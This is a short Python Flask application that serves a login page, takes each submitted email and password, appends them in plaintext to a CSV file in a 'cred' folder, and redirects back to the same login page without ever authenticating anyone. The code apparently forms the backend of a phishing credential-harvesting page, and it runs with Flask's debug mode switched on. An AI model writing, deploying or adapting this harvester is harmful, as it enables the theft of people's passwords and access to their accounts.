from flask import Flask, render_template, request, redirect, url_for
import csv
import os

# Check if the 'cred' folder exists, if not, create it
if not os.path.exists('cred'):
    os.makedirs('cred')

# Path to the CSV file within the 'cred' folder
csv_file_path = os.path.join('cred', 'users.csv')

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('login.html')


@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']
    
    # Save email and password to CSV file
    with open(csv_file_path, 'a', newline='') as csvfile:
        writer = csv.writer(csvfile)
        writer.writerow([email, password])
    
    return redirect(url_for('index'))


if __name__ == '__main__':
    app.run(debug=True)